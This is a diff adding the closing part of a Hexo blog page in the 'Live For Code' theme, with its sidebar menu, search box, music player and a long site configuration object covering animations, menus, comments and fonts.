+                    <div class="introduce-user"><span>懒羊羊</span></div>
+                </div> 
+            </div> 
+            <div class="menu-list">
+                <ul>
+                    
+                        <li class=""><a href="/" class="" target="_self"><span class="iconfont icon-home-fill"></span>首页</a></li>
+                    
+                        <li class=""><a href="/category" class="" target="_self"><span class="iconfont icon-folder-fill"></span>分类</a></li>
+                    
+                        <li class=""><a href="/tag" class="" target="_self"><span class="iconfont icon-discount-fill"></span>标签</a></li>
+                    
+                        <li class=""><a href="/archive" class="" target="_self"><span class="iconfont icon-calendar-fill"></span>归档</a></li>
+                    
+                        <li class=""><a href="/donate" class="" target="_self"><span class="iconfont icon-heart-fill"></span>赞赏</a></li>
+                    
+                        <li class=""><a href="/about" class="" target="_self"><span class="iconfont icon-about-fill"></span>关于</a></li>
+                    
+                        <li class=""><a href="/atom.xml" class="" target="_blank"><span class="iconfont icon-rss"></span>订阅</a></li>
+                    
+                        <li class=""><a href="javascript:;" class="search" target="_self"><span class="iconfont icon-search-menu"></span>搜索</a></li>
+                    
+                        <li class=""><a href="/comment" class="" target="_self"><span class="iconfont icon-comments-fill"></span>留言板</a></li>
+                    
+                        <li class=""><a href="/friend" class="" target="_self"><span class="iconfont icon-link"></span>友情链接</a></li>
+                    
+                </ul> 
+            </div> 
+            <div class="menu-link">
+                <div class="box">
+                    <div class="image-box"></div>
+                </div>
+                
+                    <a name="知乎" href="https://zhihu.com/people/worstone-29" class="" target="_blank" data=""><span class="iconfont icon-zhihu"></span></a>
+                
+                    <a name="微博" href="https://weibo.com/u/5749847477" class="" target="_blank" data=""><span class="iconfont icon-weibo"></span></a>
+                
+                    <a name="QQ" href="javascript:;" class="image" target="_self" data="/image/sidebar/qq.png"><span class="iconfont icon-qq"></span></a>
+                
+                    <a name="微信" href="javascript:;" class="" target="_self" data=""><span class="iconfont icon-wechat"></span></a>
+                
+                    <a name="GitHub" href="https://github.com/first19326" class="" target="_blank" data=""><span class="iconfont icon-github"></span></a>
+                
+            </div> 
+        </nav>
+        <button class="menu-button-close"></button>
+        <div class="morph-shape" id="morph-shape" data-morph-open="M-7.312,0H15c0,0,66,113.339,66,399.5C81,664.006,15,800,15,800H-7.312V0z;M-7.312,0H100c0,0,0,113.839,0,400c0,264.506,0,400,0,400H-7.312V0z">
+            <svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="0 0 100 800" preserveAspectRatio="none">
+                <path d="M-7.312,0H0c0,0,0,113.839,0,400c0,264.506,0,400,0,400h-7.312V0z"/>
+            </svg>
+        </div>
+    </div>
+    <button class="menu-button-open">MENU</button>
+    <div class="menu-cover"></div>
+</div>
+    <link type="text/css" rel="stylesheet" href="/css/search.css">
+<script type="text/javascript" src="/js/iscroll.js"></script>
+<script type="text/javascript" src="/js/instantsearch.min.js"></script>
+<div class="search-window">
+    <div class="search-content">
+        <div class="search-content-icon">
+            <i class="iconfont icon-search"></i>
+        </div>
+        <div id="search-input" class="search-input"></div>
+    </div>
+
+    <div class="search-scroll">
+        <div class="search-result">
+            <div id="search-stats" class="search-stats"></div>
+            <div id="search-hits"></div>
+            <div id="search-pagination" class="search-pagination"></div>
+        </div>
+    </div>
+
+    <span class="search-close-icon">
+        <i class="iconfont icon-close"></i>
+    </span>
+</div>
+    <div id="tools">
+    <div class="progressbar-top"></div>
+
+    
+        <link type="text/css" rel="stylesheet" href="/css/APlayer.css">
+        <script type="text/javascript" src="/js/APlayer.min.js"></script>
+        <script type="text/javascript" src="/js/Meting.min.js"></script>
+        <meting-js id="3778678" lrcshow="false" server="netease" type="playlist" fixed="true" autoplay="false" loop="all" order="random" preload="auto" volume="0.67" mutex="true"></meting-js>
+    
+    
+    <div class="wrap-right">
+        <div class="setting">
+            <div class="iconbox favorites" switch="false">
+                <span class="iconfont icon-favorites"></span>
+                <span class="icontext">关注</span>
+            </div>
+            <div class="iconbox mode">
+                <div class="light">
+                    <span class="iconfont icon-daymode"></span>
+                    <span class="icontext">浅色模式</span>
+                </div>
+                <div class="dark">
+                    <span class="iconfont icon-nightmode-fill"></span>
+                    <span class="icontext">深色模式</span>
+                </div>
+            </div>
+            <a href="javascript:;" target="_self" class="search">
+                <div class="iconbox">
+                    <span class="iconfont icon-search-menu"></span>
+                    <span class="icontext">搜索</span>
+                </div>
+            </a>
+            <div class="iconbox bottom">
+                <div style="display: inline-block; transform: rotate(180deg);">
+                    <span class="iconfont icon-top"></span>
+                </div>
+                <span class="icontext">跳至底部</span>
+            </div>
+        </div>
+        <div class="iconbox set">
+            <div style="display: inline-block;">
+                <span class="iconfont icon-setting"></span>
+            </div>
+            <span class="icontext">设置</span>
+        </div>
+        <div class="iconbox top">
+            <span class="iconfont icon-top"></span>
+            <span class="icontext">返回顶部</span>
+        </div>
+    </div>
+    <div class="loading"></div>
+</div>
+    <script>
+    window.config = {
+        GitHubUserName     : "Daylovef",
+        GitHubRepositories : "Hexo-LiveForCode",
+
+        User             : "懒羊羊",
+        UserAvatar       : "/image/sidebar/-f128e7dd768b5.jpg",
+        WebsiteStartDate : "2020-01-01",
+
+        WebsiteTitleBlur         : "(◍´꒳`◍) FYL is my girlfriend",
+        WebsiteTitleBlurTimeOut  : 500,
+        WebsiteTitleFocus        : "(*´∇｀*) 欢迎回来!",
+        WebsiteTitleFocusTimeOut : 1000,
+        WebsiteFavicon           : "/image/website/logo.png",
+
+        ProgressBar : {
+            id       : "topProgressBar",
+            color    : "#77B6FF",
+            height   : "2px",
+            duration : 0.2
+        },
+
+        Loading: {
+            rebound : {
+                tension  : 16,
+                friction : 5
+            },
+            spinner : {
+                id     : "spinner",
+                radius : 90,
+                sides  : 3,
+                depth  : 4,
+                colors : {
+                    background : "#F0F0F0",
+                    stroke     : "#272633",
+                    base       : "",
+                    child      : "#272633"
+                },
+                alwaysForward : true,
+                restAt        : 0.5,
+                renderBase    : false
+            }
+        },
+
+        HomeHeaderAnimationRendered : true,
+        HomeHeaderAnimation         : {
+            radius      : 15,
+            density     : 0.2,
+            color       : "rgba(255, 255, 255, .2)",
+            clearOffset : 0.3
+        },
+
+        BackAnimationRendered          : true,
+        IEBrowserBackAnimationRendered : false,
+        BackAnimation                  : {
+            colorSaturation  : "60%",
+            colorBrightness  : "50%",
+            colorAlpha       : 0.5,
+            colorCycleSpeed  : 5,
+            verticalPosition : "random",
+            horizontalSpeed  : 200,
+            ribbonCount      : 3,
+            strokeSize       : 0,
+            parallaxAmount   : -0.2,
+            animateSections  : true
+        },
+
+        HomeHeaderImage : [
+            
+                "/image/header/51c6d5c3154ea2f0.jpg",
+            
+                "/image/header/home.jpg",
+            
+                "/image/header/home.jpeg",
+            
+        ],
+        HomeBannerText  : "",
+
+        ArticleHeaderImage : [
+            
+                "/image/header/article.jpg",
+            
+        ],
+
+        OtherBannerText : "",
+
+        Error : {
+            icon    : "icon-swimming",
+            title   : "PAGE NOT FOUND",
+            content : [
+                
+                    "很抱歉，您访问的页面不存在！",
+                
+                    "可能是输入地址有误或该地址已变更。",
+                
+            ],
+            buttons : [
+                
+                    {
+                        icon  : "icon-home",
+                        text  : "返回首页",
+                        href  : "/",
+                        class : ""
+                    },
+                
+            ]
+        },
+
+        MenuNotice : {
+            enable : true,
+            notice : "简单地活着，肆意而又精彩！",
+            speed  : 20
+        },
+        MenuList : [
+            
+                {
+                    name   : "首页",
+                    icon   : "icon-home-fill",
+                    href   : "/",
+                    type   : "index",
+                    class  : "",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "分类",
+                    icon   : "icon-folder-fill",
+                    href   : "/category",
+                    type   : "category",
+                    class  : "",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "标签",
+                    icon   : "icon-discount-fill",
+                    href   : "/tag",
+                    type   : "tag",
+                    class  : "",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "归档",
+                    icon   : "icon-calendar-fill",
+                    href   : "/archive",
+                    type   : "archive",
+                    class  : "",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "赞赏",
+                    icon   : "icon-heart-fill",
+                    href   : "/donate",
+                    type   : "donate",
+                    class  : "",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "关于",
+                    icon   : "icon-about-fill",
+                    href   : "/about",
+                    type   : "about",
+                    class  : "",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "订阅",
+                    icon   : "icon-rss",
+                    href   : "/atom.xml",
+                    type   : "",
+                    class  : "",
+                    target : "_blank"
+                },
+            
+                {
+                    name   : "搜索",
+                    icon   : "icon-search-menu",
+                    href   : "javascript:;",
+                    type   : "",
+                    class  : "search",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "留言板",
+                    icon   : "icon-comments-fill",
+                    href   : "/comment",
+                    type   : "comment",
+                    class  : "",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "友情链接",
+                    icon   : "icon-link",
+                    href   : "/friend",
+                    type   : "friend",
+                    class  : "",
+                    target : "_self"
+                },
+            
+        ],
+        MenuLink : [
+            
+                
+                    {
+                        name   : "知乎",
+                        icon   : "icon-zhihu",
+                        href   : "https://zhihu.com/people/worstone-29",
+                        class  : "",
+                        target : "_blank",
+                        image  : ""
+                    },
+                
+                    {
+                        name   : "微博",
+                        icon   : "icon-weibo",
+                        href   : "https://weibo.com/u/5749847477",
+                        class  : "",
+                        target : "_blank",
+                        image  : ""
+                    },
+                
+                    {
+                        name   : "QQ",
+                        icon   : "icon-qq",
+                        href   : "javascript:;",
+                        class  : "image",
+                        target : "_self",
+                        image  : "/image/sidebar/qq.png"
+                    },
+                
+                    {
+                        name   : "微信",
+                        icon   : "icon-wechat",
+                        href   : "javascript:;",
+                        class  : "",
+                        target : "_self",
+                        image  : ""
+                    },
+                
+                    {
+                        name   : "GitHub",
+                        icon   : "icon-github",
+                        href   : "https://github.com/first19326",
+                        class  : "",
+                        target : "_blank",
+                        image  : ""
+                    },
+                
+            
+        ],
+
+        FooterStyle : 2,
+        BottomText  : "<div><span class='face'>ღゝ◡╹)ノ♡</span></div><div>【人生若只如初见<span><i class='iconfont icon-like-fill'></i></span>何事秋风悲画扇】</div><div>&copy; 2020-2022 WorstOne. All Rights Reserved.</div>",
+
+        ConsoleList : [
+            
+                
+                    [
+                        
+                            
+                                "Based on cnblogs theme SimpleMemory.",
+                            
+                                "",
+                            
+                        
+                    ],
+                
+                    [
+                        
+                            
+                                "SimpleMemory Author:",
+                            
+                                "BNDong",
+                            
+                        
+                    ],
+                
+                    [
+                        
+                            
+                                "Theme:",
+                            
+                                "LiveForCode",
+                            
+                        
+                    ],
+                
+            
+        ],
+
+        FontIconExtend : "",
+
+        Donate : {
+            paypal  : "",
+            bitcoin : "",
+            alipay  : "/image/donate/alipay.png",
+            wechat  : "/image/donate/wechat.png"
+        },
+
+        Search : {
+            applicationID : "010C3EANT8",
+            apiKey        : "c7abab9f11b79102b9aff7fe6d41447d",
+            indexName     : "Notes",
+            hits          : {
+                page : 10
+            },
+            labels        : {
+                placeholder : "搜索",
+                empty       : "未发现与 「${query}」 相关的内容",
+                stats       : "${hits} 条相关条目，使用了 ${time} 毫秒",
+            }
+        }, 
+
+        Valine : {
+            switch         : true,
+            el             : ".comments-content",
+            appId          : "srhKtvWPQTWYKh3qX8G8M7v0-gzGzoHsz",
+            appKey         : "8uVSP1q6UlALVC5igYfIfv2h",
+            serverURLs     : "",
+            placeholder    : "你是我一生只会遇见一次的惊喜...",
+            avatar         : "mm",
+            meta           : "nick,mail,link",
+            requiredFields : "nick,mail",
+            pageSize       : 5,
+            lang           : "zh-cn",
+            visitor        : true,
+            enableQQ       : true
+        },
+
+        Tocbot : {
+            switch                : true,
+            tocSelector           : ".toc",
+            contentSelector       : ".article-body",
+            headingSelector       : "h1, h2, h3, h4, h5",
+            headingsOffset        : 0,
+            scrollSmooth          : true,
+            scrollSmoothOffset    : -5,
+            positionFixedSelector : ".toc",
+            positionFixedClass    : "toc-fixed",
+            fixedSidebarOffset    : "",
+        },
+
+        Require : {
+            baseUrl     : "/js/",
+            waitSeconds : 100
+        },
+
+        Music : {
+            type : "Meting"
+        },
+        APlayer : {
+            container : ".aplayer",
+            fixed     : true,
+            autoplay  : false,
+            loop      : "all",
+            order     : "random",
+            preload   : "auto",
+            volume    : 0.67,
+            mutex     : true,
+            lrcType   : 3,
+            audio     : [
+                
+                    {
+                        name   : "Endless Tears",
+                        artist : "CLIFF EDGE",
+                        cover  : "/music/cover/Endless Tears.jpg",
+                        url    : "/music/song/Endless Tears.mp3",
+                        lrc    : "/music/lrc/Endless Tears.lrc"
+                    },
+                
+            ]
+        },
+        Meting : {
+            id       : "3778678", 
+            lrcshow  : false, 
+            server   : "netease", 
+            type     : "playlist", 
+            fixed    : true, 
+            autoplay : false, 
+            loop     : "all", 
+            order    : "random", 
+            preload  : "auto", 
+            volume   : 0.67, 
+            mutex    : true
+        },
+
+        Mouse : {
+            enable  : true,
+            options : {
+                size  : 6,
+                sizeF : 24
+            }
+        },
+
+        LazyLoad : {
+            default : "/image/website/lazyload.svg"
+        },
+  
+        Style : {
+            aplayer          : "/css/APlayer.css",
+            archive          : "/css/archive.css",
+            base             : "/css/base.css",
+            clipboard        : "/css/clipboard.css",
+            code             : "/css/code.css",
+            donate           : "/css/donate.css",
+            fancybox         : "/css/jquery.fancybox.css",
+            footer           : "/css/footer.css",
+            iconfont         : "/iconfont/iconfont.css",
+            index            : "/css/index.css",
+            menuBubble       : "/css/menu-bubble.css",
+            mouse            : "/css/mouse.css",
+            page             : "/css/page.css",
+            post             : "/css/post.css",
+            search           : "/css/search.css",
+            tocbot           : "/css/tocbot.css",
+            valine           : "/css/valine.css"
+        },
+
+        Script: {
+            aplayer          : "/js/APlayer.min.js",
+            config           : "/js/require.config.js",
+            index            : "/js/index.js",
+            instantSearch    : "/js/instantsearch.min.js",
+            iscroll          : "/js/iscroll.js",
+            jQuery           : "/js/jquery-3.4.1.min.js",
+            loading          : "/js/loading.js",
+            meting           : "/js/Meting.min.js",
+            require          : "/js/require.min.js"
+        },
+
+        Font: {
+            LongCang    : "/font/LongCang.css",
+            Monda       : "/font/Monda.css",
+            NotoSansSC  : "/font/NotoSansSC.css",
+            NotoSerifSC : "/font/NotoSerifSC.css",
+            Playball    : "/font/Playball.css",
+            PTMono      : "/font/PTMono.css",
+            Roboto      : "/font/Roboto.css",
+            RobotoSlab  : "/font/RobotoSlab.css",
+            Rosario     : "/font/Rosario.css",
+            UbuntuMono  : "/font/UbuntuMono.css"
+        },
+
+        Suffix : {
+            about : "简单地活着, 肆意又精彩."
+        },
+            
+        Theme : {
+            url  : "https://github.com/first19326/Hexo-LiveForCode",
+            name : "Hexo - Live For Code"
+        }  
+    };
+</script>
+    <script type="text/javascript" src="/js/index.js"></script>
+</body>
+</html>
